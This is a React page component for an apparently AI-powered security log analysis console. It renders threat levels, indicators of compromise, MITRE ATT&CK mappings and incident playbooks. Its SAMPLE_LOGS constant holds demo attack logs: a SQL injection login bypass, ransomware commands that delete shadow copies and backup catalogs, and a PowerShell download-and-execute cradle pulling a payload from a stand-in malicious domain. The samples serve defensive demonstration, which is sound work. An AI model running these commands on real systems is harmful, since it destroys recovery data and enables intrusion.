import React, { useState } from "react";
import { useAnalyzeLogs, useSaveReport } from "@workspace/api-client-react";
import { useAuth } from "@/lib/auth-context";
import { getAuthHeaders } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { AuthModal } from "@/components/auth/auth-modal";
import { RiskGauge } from "@/components/visuals/risk-gauge";
import { NetworkGraph } from "@/components/visuals/network-graph";
import { Activity, ShieldAlert, Cpu, CheckCircle2, Save, Loader2, Play, Copy, ExternalLink, Download, FileJson, Target, Shield, BookOpen, AlertTriangle, User } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";

const SAMPLE_LOGS = {
  sql: "192.168.1.100 - - [10/Oct/2023:13:55:36 -0700] \"GET /login.php?user=admin'%20OR%20'1'='1'-- HTTP/1.1\" 200 4523\n192.168.1.100 - - [10/Oct/2023:13:55:38 -0700] \"POST /api/users HTTP/1.1\" 500 120\n192.168.1.100 - - [10/Oct/2023:13:55:40 -0700] \"GET /admin/dashboard HTTP/1.1\" 200 8900",
  ransomware: "EventID: 4688, Task Category: Process Creation, cmdline: vssadmin.exe Delete Shadows /All /Quiet\nEventID: 4688, Task Category: Process Creation, cmdline: bcdedit /set {default} recoveryenabled No\nEventID: 4688, Task Category: Process Creation, cmdline: wbadmin delete catalog -quiet",
  apt: "Action: Network Connection, Source IP: 10.0.0.5, Destination IP: 185.199.108.153, Destination Port: 443, Process: powershell.exe\nAction: Process Create, Parent: svchost.exe, Process: cmd.exe /c powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://malicious-domain.com/payload.ps1')\"\nAction: Registry Edit, Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater, Value: C:\\Users\\Public\\payload.exe"
};

export default function Analyze() {
  const { isAuthenticated, token } = useAuth();
  const [logs, setLogs] = useState("");
  const [showAuthModal, setShowAuthModal] = useState(false);
  
  const analyzeMutation = useAnalyzeLogs({ request: getAuthHeaders(token) });
  const saveMutation = useSaveReport({ request: getAuthHeaders(token) });

  const handleAnalyze = () => {
    if (!isAuthenticated) {
      setShowAuthModal(true);
      return;
    }
    if (!logs.trim()) return;
    
    analyzeMutation.mutate({ data: { logs } });
  };

  const handleSave = () => {
    if (!analyzeMutation.data) return;
    const title = prompt("Enter a title for this report:", "Incident Report");
    if (!title) return;
    
    saveMutation.mutate({
      data: {
        title,
        logs,
        result: analyzeMutation.data
      }
    }, {
      onSuccess: () => {
        alert("Report saved successfully!");
      }
    });
  };

  const handleExportJson = () => {
    if (!analyzeMutation.data) return;
    const dataStr = JSON.stringify(analyzeMutation.data, null, 2);
    const blob = new Blob([dataStr], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "shadowstrike-analysis.json";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleCopyIOCs = () => {
    if (!analyzeMutation.data?.iocs) return;
    const text = analyzeMutation.data.iocs.map(ioc => `${ioc.type}: ${ioc.value}`).join('\n');
    navigator.clipboard.writeText(text);
    alert("IOCs copied to clipboard!");
  };

  const getThreatColor = (level: string) => {
    switch (level) {
      case 'low': return 'success';
      case 'medium': return 'warning';
      case 'high': return 'destructive';
      case 'critical': return 'critical';
      default: return 'default';
    }
  };

  const getIocColor = (type: string) => {
    switch (type) {
      case 'ip': return 'bg-blue-100 text-blue-800 border-blue-200';
      case 'domain': return 'bg-purple-100 text-purple-800 border-purple-200';
      case 'hash': return 'bg-orange-100 text-orange-800 border-orange-200';
      case 'cve': return 'bg-red-100 text-red-800 border-red-200';
      case 'url': return 'bg-green-100 text-green-800 border-green-200';
      default: return 'bg-gray-100 text-gray-800 border-gray-200';
    }
  };

  const data = analyzeMutation.data;

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
      <AuthModal isOpen={showAuthModal} onClose={() => setShowAuthModal(false)} />

      <div className="mb-8 flex flex-col md:flex-row md:items-end justify-between gap-4">
        <div>
          <h1 className="text-3xl font-display font-bold text-foreground mb-2">Threat Analysis Console</h1>
          <p className="text-muted-foreground">Paste your raw security logs below for AI-powered investigation.</p>
        </div>
      </div>

      <div className="grid lg:grid-cols-12 gap-8">
        {/* Left Column: Input */}
        <div className="lg:col-span-4 flex flex-col gap-4">
          <div className="flex flex-wrap gap-2">
            <Badge variant="outline" className="cursor-pointer hover:bg-slate-100 py-1.5 px-3 font-medium border-slate-300" onClick={() => setLogs(SAMPLE_LOGS.sql)}>SQL Injection</Badge>
            <Badge variant="outline" className="cursor-pointer hover:bg-slate-100 py-1.5 px-3 font-medium border-slate-300" onClick={() => setLogs(SAMPLE_LOGS.ransomware)}>Ransomware</Badge>
            <Badge variant="outline" className="cursor-pointer hover:bg-slate-100 py-1.5 px-3 font-medium border-slate-300" onClick={() => setLogs(SAMPLE_LOGS.apt)}>APT Recon</Badge>
          </div>

          <Card className="flex-1 flex flex-col shadow-md border-slate-200 h-[600px]">
            <CardHeader className="bg-slate-50/50 border-b border-slate-100 pb-4">
              <CardTitle className="text-lg flex items-center gap-2">
                <Activity className="w-5 h-5 text-primary" />
                Raw Logs Input
              </CardTitle>
            </CardHeader>
            <CardContent className="p-0 flex-1 flex flex-col relative">
              <textarea
                value={logs}
                onChange={(e) => setLogs(e.target.value)}
                placeholder="Paste syslogs, AWS CloudTrail, firewall logs, or application logs here..."
                className="w-full h-full p-6 resize-none outline-none font-mono text-xs text-slate-700 bg-transparent placeholder:text-slate-400"
              />
              <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-white via-white/90 to-transparent">
                <Button 
                  onClick={handleAnalyze} 
                  disabled={!logs.trim() || analyzeMutation.isPending}
                  className="w-full h-12 text-base shadow-lg shadow-primary/25"
                >
                  {analyzeMutation.isPending ? (
                    <><Loader2 className="w-5 h-5 mr-2 animate-spin" /> Analyzing Logs...</>
                  ) : (
                    <><Play className="w-5 h-5 mr-2" /> Run Analysis</>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Right Column: Results */}
        <div className="lg:col-span-8 space-y-6">
          {!data && !analyzeMutation.isPending && (
            <div className="h-full min-h-[600px] flex items-center justify-center border-2 border-dashed border-slate-200 rounded-3xl bg-slate-50/50">
              <div className="text-center">
                <div className="w-16 h-16 bg-white rounded-full shadow-sm border flex items-center justify-center mx-auto mb-4">
                  <ShieldAlert className="w-8 h-8 text-slate-300" />
                </div>
                <h3 className="text-lg font-semibold text-slate-700">Awaiting Input</h3>
                <p className="text-sm text-slate-500 max-w-sm mt-2">Run analysis on your logs to generate a comprehensive threat report.</p>
              </div>
            </div>
          )}

          {analyzeMutation.isPending && (
            <div className="h-full min-h-[600px] flex items-center justify-center border border-slate-100 rounded-3xl bg-white shadow-sm">
              <div className="text-center flex flex-col items-center">
                <div className="relative w-20 h-20 mb-6">
                  <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-primary rounded-full border-t-transparent animate-spin"></div>
                  <Cpu className="absolute inset-0 m-auto w-8 h-8 text-primary animate-pulse" />
                </div>
                <h3 className="text-xl font-semibold text-foreground">Processing Telemetry...</h3>
                <p className="text-sm text-muted-foreground mt-2">Extracting IOCs, mapping MITRE techniques, and generating playbooks...</p>
              </div>
            </div>
          )}

          {data && (
            <motion.div 
              initial={{ opacity: 0, y: 20 }} 
              animate={{ opacity: 1, y: 0 }}
              className="space-y-6"
            >
              <div className="flex items-center justify-between bg-slate-900 rounded-2xl p-4 shadow-lg text-white mb-6">
                <div className="flex gap-4 items-center">
                  <Shield className="w-6 h-6 text-primary" />
                  <div>
                    <div className="text-sm text-slate-400">Analysis Complete</div>
                    <div className="font-bold">Confidence: {data.confidenceScore}%</div>
                  </div>
                  <div className="w-32 h-2 bg-slate-800 rounded-full overflow-hidden ml-2 hidden sm:block">
                    <div className="h-full bg-primary" style={{ width: `${data.confidenceScore}%` }} />
                  </div>
                </div>
                <div className="flex gap-2">
                  <Button size="sm" variant="outline" className="border-slate-700 hover:bg-slate-800 text-slate-200 hover:text-white h-9" onClick={handleExportJson}>
                    <FileJson className="w-4 h-4 mr-2" /> Export JSON
                  </Button>
                  <Button size="sm" onClick={handleSave} disabled={saveMutation.isPending} className="h-9 shadow-lg shadow-primary/20">
                    {saveMutation.isPending ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />} Save Report
                  </Button>
                </div>
              </div>

              {/* Top Metrics Row */}
              <div className="grid sm:grid-cols-2 gap-6">
                <Card className="overflow-hidden border-slate-200">
                  <div className="flex h-full">
                    <div className="p-6 flex-1 flex flex-col justify-center">
                      <p className="text-sm font-medium text-muted-foreground uppercase tracking-wider mb-2">Threat Level</p>
                      <Badge variant={getThreatColor(data.threatLevel)} className="w-fit text-lg px-4 py-1 uppercase tracking-widest font-bold">
                        {data.threatLevel}
                      </Badge>
                      
                      <div className="mt-6 space-y-3">
                        <div>
                          <p className="text-xs text-muted-foreground uppercase">Attacker Origin</p>
                          <p className="font-semibold text-foreground">{data.attackerOrigin}</p>
                        </div>
                        <div>
                          <p className="text-xs text-muted-foreground uppercase">Attack Type</p>
                          <p className="font-semibold text-foreground">{data.attackType}</p>
                        </div>
                      </div>
                    </div>
                    <div className="w-1 bg-slate-100 my-6"></div>
                    <div className="p-6 flex items-center justify-center">
                      <RiskGauge score={data.riskScore} />
                    </div>
                  </div>
                </Card>

                <Card className="border-slate-200 flex flex-col">
                  <CardHeader className="pb-3 bg-slate-50/50">
                    <CardTitle className="text-lg">Executive Summary</CardTitle>
                  </CardHeader>
                  <CardContent className="pt-4 flex-1">
                    <p className="text-slate-700 leading-relaxed text-sm">
                      {data.summary}
                    </p>
                    
                    {data.cveIds && data.cveIds.length > 0 && (
                      <div className="mt-4 pt-4 border-t border-slate-100">
                        <p className="text-xs text-muted-foreground uppercase mb-2">Identified Vulnerabilities</p>
                        <div className="flex flex-wrap gap-2">
                          {data.cveIds.map(cve => (
                            <a 
                              key={cve} 
                              href={`https://nvd.nist.gov/vuln/detail/${cve}`}
                              target="_blank"
                              rel="noreferrer"
                              className="inline-flex items-center px-2.5 py-1 rounded-md bg-rose-50 text-rose-700 border border-rose-200 text-xs font-mono hover:bg-rose-100 transition-colors"
                            >
                              {cve} <ExternalLink className="w-3 h-3 ml-1" />
                            </a>
                          ))}
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>

              {/* Threat Actor & IOCs */}
              <div className="grid md:grid-cols-2 gap-6">
                {data.threatActorProfile && (
                  <Card className="border-slate-200">
                    <CardHeader className="bg-slate-50/50 border-b border-slate-100 pb-4">
                      <CardTitle className="text-lg flex items-center gap-2">
                        <User className="w-5 h-5 text-slate-500" />
                        Threat Actor Profile
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="pt-4 space-y-4">
                      <div className="flex justify-between items-start">
                        <div>
                          <h4 className="text-xl font-bold text-slate-900">{data.threatActorProfile.name}</h4>
                          <p className="text-sm text-slate-500">AKA: {data.threatActorProfile.aliases.join(", ")}</p>
                        </div>
                        <Badge variant={data.threatActorProfile.sophistication === 'nation-state' ? 'critical' : 'destructive'} className="uppercase">
                          {data.threatActorProfile.sophistication}
                        </Badge>
                      </div>
                      <p className="text-sm text-slate-700">{data.threatActorProfile.motivation}</p>
                      
                      <div>
                        <span className="text-xs text-muted-foreground uppercase mb-1 block">Target Sectors</span>
                        <div className="flex flex-wrap gap-1">
                          {data.threatActorProfile.targetSectors.map(sector => (
                            <Badge key={sector} variant="secondary" className="text-[10px]">{sector}</Badge>
                          ))}
                        </div>
                      </div>
                      
                      <div>
                        <span className="text-xs text-muted-foreground uppercase mb-1 block">Known Tools</span>
                        <div className="flex flex-wrap gap-1">
                          {data.threatActorProfile.knownTools.map(tool => (
                            <span key={tool} className="px-2 py-0.5 bg-slate-100 border border-slate-200 rounded text-xs font-mono text-slate-700">{tool}</span>
                          ))}
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {data.iocs && data.iocs.length > 0 && (
                  <Card className="border-slate-200 flex flex-col">
                    <CardHeader className="bg-slate-50/50 border-b border-slate-100 pb-4 flex flex-row items-center justify-between space-y-0">
                      <CardTitle className="text-lg flex items-center gap-2">
                        <Target className="w-5 h-5 text-slate-500" />
                        Indicators of Compromise
                      </CardTitle>
                      <Button variant="ghost" size="sm" onClick={handleCopyIOCs} className="h-8 text-xs">
                        <Copy className="w-3.5 h-3.5 mr-1" /> Copy All
                      </Button>
                    </CardHeader>
                    <CardContent className="p-0 flex-1 overflow-hidden">
                      <div className="max-h-[300px] overflow-y-auto">
                        <table className="w-full text-sm text-left">
                          <thead className="text-xs text-slate-500 bg-slate-50 sticky top-0 border-b border-slate-100">
                            <tr>
                              <th className="px-4 py-3 font-medium">Type</th>
                              <th className="px-4 py-3 font-medium">Value</th>
                              <th className="px-4 py-3 font-medium">Context</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y divide-slate-100">
                            {data.iocs.map((ioc, idx) => (
                              <tr key={idx} className="hover:bg-slate-50/50">
                                <td className="px-4 py-3">
                                  <span className={`px-2 py-1 rounded-md text-xs font-medium border ${getIocColor(ioc.type)}`}>
                                    {ioc.type.toUpperCase()}
                                  </span>
                                </td>
                                <td className="px-4 py-3 font-mono text-xs text-slate-700 break-all">{ioc.value}</td>
                                <td className="px-4 py-3 text-xs text-slate-500">{ioc.context}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </CardContent>
                  </Card>
                )}
              </div>

              {/* MITRE & Graph */}
              <Card className="border-slate-200">
                <CardHeader>
                  <CardTitle>Attack Pathology</CardTitle>
                </CardHeader>
                <CardContent>
                  <NetworkGraph 
                    nodes={data.graphNodes} 
                    edges={data.graphEdges} 
                  />
                  
                  <div className="mt-8">
                    <h4 className="text-sm font-bold text-foreground uppercase tracking-wider mb-4 border-b pb-2">MITRE ATT&CK Mapping</h4>
                    <div className="grid gap-3 md:grid-cols-2">
                      {data.mitreMappings.map((mitre) => (
                        <div key={mitre.id} className="flex gap-4 p-4 rounded-xl bg-slate-50 border border-slate-100 hover:border-primary/30 transition-colors">
                          <div className="w-16 flex-shrink-0">
                            <Badge variant="outline" className="font-mono bg-white text-[10px]">{mitre.id}</Badge>
                          </div>
                          <div>
                            <h5 className="font-semibold text-slate-900 text-sm">{mitre.name}</h5>
                            <p className="text-xs text-slate-500 mt-0.5">{mitre.tactic}</p>
                            <p className="text-xs text-slate-600 mt-2 line-clamp-2">{mitre.description}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Incident Playbook */}
              {data.incidentPlaybook && data.incidentPlaybook.length > 0 && (
                <Card className="border-primary/20 shadow-md">
                  <CardHeader className="bg-primary/5 border-b border-primary/10">
                    <CardTitle className="text-lg flex items-center gap-2 text-primary">
                      <BookOpen className="w-5 h-5" />
                      Incident Response Playbook
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="pt-6">
                    <Accordion type="single" collapsible defaultValue="item-0" className="w-full space-y-3">
                      {data.incidentPlaybook.map((step, idx) => (
                        <AccordionItem value={`item-${idx}`} key={idx} className="bg-white border border-slate-200 rounded-xl px-2 overflow-hidden data-[state=open]:border-primary/40 data-[state=open]:shadow-sm">
                          <AccordionTrigger className="hover:no-underline py-4 px-2">
                            <div className="flex items-center gap-4 text-left">
                              <div className="flex-shrink-0 w-8 h-8 rounded-full bg-slate-100 text-slate-600 flex items-center justify-center font-bold text-sm">
                                {step.step}
                              </div>
                              <div>
                                <div className="flex items-center gap-2 mb-1">
                                  <Badge variant="secondary" className="text-[10px] bg-slate-100 hover:bg-slate-100 text-slate-600">{step.phase}</Badge>
                                  <Badge variant="outline" className="text-[10px] text-slate-500 border-slate-200">{step.timeframe}</Badge>
                                </div>
                                <span className="font-semibold text-slate-900">{step.action}</span>
                              </div>
                            </div>
                          </AccordionTrigger>
                          <AccordionContent className="px-2 pb-4 text-slate-600 pl-14">
                            <div className="p-4 bg-slate-50 rounded-lg border border-slate-100 text-sm leading-relaxed">
                              {step.details}
                            </div>
                          </AccordionContent>
                        </AccordionItem>
                      ))}
                    </Accordion>
                  </CardContent>
                </Card>
              )}

            </motion.div>
          )}
        </div>
      </div>
    </div>
  );
}
